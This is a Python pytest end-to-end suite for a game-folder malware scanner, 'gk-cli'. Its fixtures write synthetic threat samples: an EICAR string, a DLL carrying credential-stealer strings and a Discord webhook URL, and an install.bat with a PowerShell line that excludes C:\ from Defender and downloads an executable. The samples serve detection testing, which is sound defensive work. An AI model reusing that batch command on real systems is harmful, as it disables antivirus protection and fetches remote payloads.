"""End-to-end scans through gk-cli (C++ orchestrator + isolated gk-scanworker processes + SQLite).

All samples are generated in temporary folders at test time. Nothing is executed except the Game Kernel
binaries themselves (and, for fault-isolation tests, fake workers that crash or hang on purpose).
"""

from __future__ import annotations

import io
import json
import os
import shutil
import signal
import sqlite3
import struct
import subprocess
import sys
import time
import zipfile
from pathlib import Path

import pytest

from gamekernel.core.models import Classification, RiskLevel
from gamekernel.database.db import Database

ROOT = Path(__file__).resolve().parents[2]
CLI_CANDIDATES = [ROOT / "build" / p / "cpp" / "cli" / ("gk-cli.exe" if os.name == "nt" else "gk-cli")
                  for p in ("linux-release", "linux-debug", "linux-asan", "windows-release/Release")]


@pytest.fixture(scope="module")
def cli():
    for c in CLI_CANDIDATES:
        if c.exists():
            return c
    if os.environ.get("GK_REQUIRE_CLI") == "1":
        pytest.fail("gk-cli não compilado")
    pytest.skip("gk-cli não compilado (requer Qt 6)")


def _pe(dll: bool = True) -> bytes:
    pe = bytearray(1024)
    pe[0:2] = b"MZ"
    struct.pack_into("<I", pe, 0x3C, 0x80)
    pe[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<HHIIIHH", pe, 0x84, 0x8664, 0, 0, 0, 0, 0xF0, 0x2022 if dll else 0x0022)
    struct.pack_into("<H", pe, 0x98, 0x20B)
    struct.pack_into("<H", pe, 0x98 + 68, 3)
    return bytes(pe)


@pytest.fixture
def game(tmp_path) -> Path:
    g = tmp_path / "Game"
    (g / "steam_settings").mkdir(parents=True)
    (g / "Data").mkdir()
    eicar = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-" + "TEST-FILE!$H+H*").encode()
    (g / "readme_eicar.com").write_bytes(eicar)
    (g / "steam_api64.dll").write_bytes(_pe() + b"\\Login Data\0encrypted_key\0CryptUnprotectData\0"
                                        b"https://discord.com/api/webhooks/123456789012/x\0")
    (g / "steam_settings" / "configs.user.ini").write_text("[user::general]\naccount_name=gamer\n")
    (g / "Game.exe").write_bytes(_pe(dll=False))
    (g / "dxgi.dll").write_bytes(_pe())
    (g / "ReShade.ini").write_text("[GENERAL]\n")
    (g / "Data" / "level1.pak").write_bytes(b"PAK\0" + bytes(20000))
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("install.bat", '@echo off\r\npowershell -w hidden -c "Add-MpPreference -ExclusionPath C:\\ ; '
                                   'iwr http://x/p.exe -OutFile $env:TEMP\\p.exe"\r\n')
        zf.writestr("svchost.exe", _pe(dll=False))
    (g / "Update_Repack.zip").write_bytes(buf.getvalue())
    return g


def _run(cli, targets, data_dir, *extra, timeout=300):
    out = data_dir.parent / f"report-{time.monotonic_ns()}.json"
    proc = subprocess.run([str(cli), "scan", *map(str, targets), "--data-dir", str(data_dir), "--json", str(out),
                           "--quiet", *extra], capture_output=True, text=True, timeout=timeout)
    report = json.loads(out.read_text()) if out.exists() else None
    return proc, report


def _by_name(report):
    return {r["name"]: r for r in report["results"]}


def test_full_scan_end_to_end(cli, game, tmp_path):
    data = tmp_path / "data"
    proc, report = _run(cli, [game], data)
    assert proc.returncode == 3, proc.stderr          # threats/suspicious found
    summary = report["summary"]
    for key in ("scan_id", "status", "mode", "targets", "started_at", "finished_at", "files_found", "files_analyzed",
                "counts_by_classification", "counts_by_risk", "max_risk", "engines", "limitations", "warnings"):
        assert key in summary, key
    assert summary["status"] == "completed" and summary["files_found"] == 8
    r = _by_name(report)
    eicar = r["readme_eicar.com"]
    assert eicar["classification"] == "malware"
    sources = {e["source"] for e in eicar["evidences"]}
    assert {"yara", "reputation"} <= sources
    if shutil.which("clamscan"):
        assert "signature" in sources                  # bundled local .hdb through clamscan
    api = r["steam_api64.dll"]
    assert api["classification"] == "suspicious" and api["crack_status"] == "suspicious"
    assert any(e["rule_id"] == "CONTEXT.Component.goldberg" for e in api["evidences"])
    assert r["dxgi.dll"]["classification"] == "unknown"
    assert any(e["rule_id"] == "CONTEXT.Component.reshade" for e in r["dxgi.dll"]["evidences"])
    assert r["install.bat"]["container"] == str(game / "Update_Repack.zip")
    assert r["install.bat"]["classification"] == "suspicious"
    assert "NAME.SystemProcessName" in {e["rule_id"] for e in r["svchost.exe"]["evidences"]}

    # The database written by C++ is read by the Python layer (reports, tools).
    db = Database(data / "gamekernel.db")
    scan = db.get_scan(summary["scan_id"])
    assert scan["status"] == "completed" and scan["threats"] == 1 and scan["max_risk"] == RiskLevel.HIGH
    rows = db.get_file_results(summary["scan_id"], classifications=[Classification.SUSPICIOUS.value])
    assert {row.name for row in rows} == {"steam_api64.dll", "install.bat", "svchost.exe"}
    assert all(row.explanation for row in rows)


def test_cache_and_no_cache(cli, game, tmp_path):
    data = tmp_path / "data"
    _run(cli, [game], data)
    _, second = _run(cli, [game], data)
    assert all(r["from_cache"] for r in second["results"] if r["status"] != "skipped")
    (game / "Game.exe").write_bytes(_pe(dll=False) + b"changed")
    _, third = _run(cli, [game], data)
    changed = _by_name(third)["Game.exe"]
    assert not changed["from_cache"]
    _, fresh = _run(cli, [game], data, "--no-cache")
    assert not any(r["from_cache"] for r in fresh["results"])


def test_quick_mode(cli, game, tmp_path):
    proc, report = _run(cli, [game], tmp_path / "data", "--quick")
    r = _by_name(report)
    assert r["level1.pak"]["status"] == "skipped" and "modo rápido" in r["level1.pak"]["status_reasons"][0]
    assert "install.bat" not in r                       # archive not expanded in quick mode
    assert r["Update_Repack.zip"]["status"] == "partial"
    assert report["summary"]["mode"] == "quick"


def _fake_worker(tmp_path: Path, mode: str) -> Path:
    target = tmp_path / f"{mode}_worker.py"
    shutil.copy(ROOT / "tests" / "native" / "fake_worker.py", target)
    target.chmod(0o755)
    return target


@pytest.mark.skipif(os.name == "nt", reason="fake worker is a Python script with a shebang (POSIX)")
def test_worker_crash_does_not_stop_the_scan(cli, game, tmp_path):
    proc, report = _run(cli, [game], tmp_path / "data", "--worker", str(_fake_worker(tmp_path, "crash")))
    assert report["summary"]["status"] == "completed", proc.stderr
    analysed = [r for r in report["results"] if r["status"] != "skipped"]
    assert analysed and all(r["status"] == "error" for r in analysed)
    # Each file is reported individually; after repeated crashes the supervisor says the worker became
    # unavailable — in every case the file was neither analysed nor executed.
    assert all("processo de análise isolado" in r["status_reasons"][0] and "executado" in r["status_reasons"][0]
               for r in analysed)
    assert report["summary"]["files_errors"] == len(analysed)


@pytest.mark.skipif(os.name == "nt", reason="fake worker is a Python script with a shebang (POSIX)")
def test_hanging_worker_hits_the_timeout(cli, tmp_path):
    folder = tmp_path / "one"
    folder.mkdir()
    (folder / "a.exe").write_bytes(_pe(dll=False))
    t0 = time.monotonic()
    proc, report = _run(cli, [folder], tmp_path / "data", "--worker", str(_fake_worker(tmp_path, "hang")),
                        "--file-timeout", "2000", timeout=120)
    assert time.monotonic() - t0 < 60
    r = _by_name(report)["a.exe"]
    assert r["status"] == "partial" and "tempo limite" in r["status_reasons"][0]


@pytest.mark.skipif(os.name == "nt", reason="SIGINT delivery differs on Windows")
def test_cancel_with_sigint(cli, tmp_path):
    folder = tmp_path / "many"
    folder.mkdir()
    for i in range(6):
        (folder / f"f{i}.exe").write_bytes(_pe(dll=False))
    out = tmp_path / "r.json"
    proc = subprocess.Popen([str(cli), "scan", str(folder), "--data-dir", str(tmp_path / "data"), "--json", str(out),
                             "--quiet", "--worker", str(_fake_worker(tmp_path, "hang")), "--workers", "1"],
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(2)
    proc.send_signal(signal.SIGINT)
    assert proc.wait(timeout=60) == 4
    report = json.loads(out.read_text())
    assert report["summary"]["status"] == "cancelled"
    assert Database(tmp_path / "data" / "gamekernel.db").get_scan(report["summary"]["scan_id"])["status"] == "cancelled"


def test_cli_rejects_missing_target(cli, tmp_path):
    proc, report = _run(cli, [tmp_path / "nao-existe"], tmp_path / "data")
    assert report["summary"]["files_found"] == 0
    assert any("nao-existe" in w for w in report["summary"]["warnings"])


def test_risk_engine_failure_never_hides_evidence(cli, tmp_path):
    """Installation without contracts/threat_catalog.json (the packaging bug found by the B10 end-to-end test):
    the scan must not report an EICAR with YARA/reputation evidence as "unknown, no risk"."""
    install = tmp_path / "instalacao"
    install.mkdir()
    for binary in (cli, cli.parent.parent / "worker" / cli.name.replace("gk-cli", "gk-scanworker")):
        shutil.copy2(binary, install / binary.name)
    shutil.copytree(ROOT / "signatures", install / "signatures")      # no contracts/: the risk engine cannot load
    game = tmp_path / "Jogo"
    game.mkdir()
    (game / "leia_eicar.com").write_bytes(("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-"
                                           + "TEST-FILE!$H+H*").encode())
    (game / "config.ini").write_text("[video]\nfullscreen=1\n")
    proc, report = _run(install / cli.name, [game], tmp_path / "data")
    assert report is not None, proc.stderr
    assert any("Motor de risco indisponível" in w for w in report["summary"]["warnings"])
    assert any("avaliação de risco não pôde ser concluída" in x for x in report["summary"]["limitations"])
    r = _by_name(report)
    eicar = r["leia_eicar.com"]
    assert eicar["classification"] == "inconclusive" and eicar["status"] == "partial"
    assert eicar["risk"] != "NONE" and eicar["evidences"]
    assert r["config.ini"]["classification"] == "unknown"                # nothing to hide: left as is


def test_portable_copy_keeps_its_data_next_to_the_program(cli, tmp_path):
    """portable.flag next to gk-cli: without --data-dir the database goes to <program>/data, like the UI."""
    portable = tmp_path / "GameKernel"
    portable.mkdir()
    for binary in (cli, cli.parent.parent / "worker" / cli.name.replace("gk-cli", "gk-scanworker")):
        shutil.copy2(binary, portable / binary.name)
    shutil.copytree(ROOT / "signatures", portable / "signatures")
    shutil.copytree(ROOT / "contracts", portable / "contracts")
    (portable / "portable.flag").write_text("portátil")
    target = tmp_path / "Jogo"
    target.mkdir()
    (target / "readme.txt").write_text("nada aqui")
    env = {k: v for k, v in os.environ.items() if k != "GAMEKERNEL_DATA_DIR"}
    env["LOCALAPPDATA"] = env["XDG_DATA_HOME"] = str(tmp_path / "perfil-do-usuario")
    proc = subprocess.run([str(portable / cli.name), "scan", str(target), "--quiet"], capture_output=True, text=True,
                          timeout=300, env=env)
    assert proc.returncode == 0, proc.stderr
    assert (portable / "data" / "gamekernel.db").is_file()
    assert not (tmp_path / "perfil-do-usuario").exists()


def test_settings_json_is_honoured(cli, game, tmp_path):
    """The user's settings.json (the one the application writes) drives gk-cli too: folder and extension
    exclusions — a sibling folder whose name only starts the same is still scanned —, ClamAV turned off and the
    number of workers; command-line options still win."""
    eicar = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-" + "TEST-FILE!$H+H*").encode()
    (game / "Data2").mkdir()
    (game / "Data2" / "copia_eicar.com").write_bytes(eicar)
    data = tmp_path / "data"
    data.mkdir()
    (data / "settings.json").write_text(json.dumps({
        "scan": {"excluded_paths": [str(game / "Data") + os.sep], "excluded_extensions": ["INI"], "max_workers": 3},
        "engines": {"clamav": {"enabled": False}},
    }), encoding="utf-8")
    proc, report = _run(cli, [game], data)
    assert proc.returncode == 3, proc.stderr
    r = _by_name(report)
    assert "level1.pak" not in r                                  # inside the excluded folder: not even listed
    assert r["copia_eicar.com"]["classification"] == "malware"   # "Data2" is not "Data"
    for name in ("ReShade.ini", "configs.user.ini"):
        assert r[name]["status"] == "skipped" and "excluído nas configurações" in r[name]["status_reasons"], name
    clamav = next(e for e in report["summary"]["engines"] if e["key"] == "clamav")
    assert clamav["available"] is False
    # The summary says why: turned off by the user, not missing from the installation.
    assert any("ClamAV desativado nas configurações" in item for item in report["summary"]["limitations"])
    assert not any("indisponível nesta instalação" in item for item in report["summary"]["limitations"])

    def workers_of_last_scan():
        with sqlite3.connect(data / "gamekernel.db") as db:
            return json.loads(db.execute("SELECT options FROM scans ORDER BY id DESC LIMIT 1").fetchone()[0])["workers"]

    assert workers_of_last_scan() == 3
    proc, _ = _run(cli, [game], data, "--workers", "1")
    assert proc.returncode == 3, proc.stderr
    assert workers_of_last_scan() == 1                            # the command line wins
